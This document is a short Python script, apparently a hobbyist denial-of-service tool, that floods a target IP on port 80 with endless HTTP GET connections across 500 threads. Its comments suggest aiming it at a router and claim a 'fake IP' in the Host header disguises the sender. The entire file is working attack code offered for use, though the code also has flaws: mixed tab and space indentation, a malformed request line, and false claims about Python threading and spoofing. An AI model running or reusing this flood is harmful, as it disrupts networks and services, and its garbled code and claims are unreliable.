import threading
import socket

#Our goal here is an endless loop of socket connections via HTTP GET requests
##Keep in mind Python is not multi-threaded so another language would be more applicable here

TargetIP = 'IP.IP.IP.IP' #Feasibly you can run ipconfig and then target your router(default gateway)
port = 80 #HTTP
FakeIP = 'IP.IP.IP.IP' #Fake IP for the header of our packet

attack_num = 0

def attack():
	while True:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Creating a new TCP socket
		s.connect((TargetIP, port)) #Connect to target over that port
		s.sendto(("GET /" + TargetIP + "HTTP/1.1\r\n").encode('ascii'), (TargetIP,port)) #We create HTTP GET requests encoded in ASCII that we are going to send, repeatedly, to our target.
		s.sendto(("Host: " + FakeIP + "\r\n\r\n").encode('ascii'),(TargetIP,port)) # Injecting our fake IP-address into the request.

		#keeping track of our succesful connections
		global attack_num
        attack_num += 1

		s.close()

for i in range(500): #running 500 threads
    thread = threading.Thread(target=attack)
    thread.start()

#Print the # of hits

print(attack_num)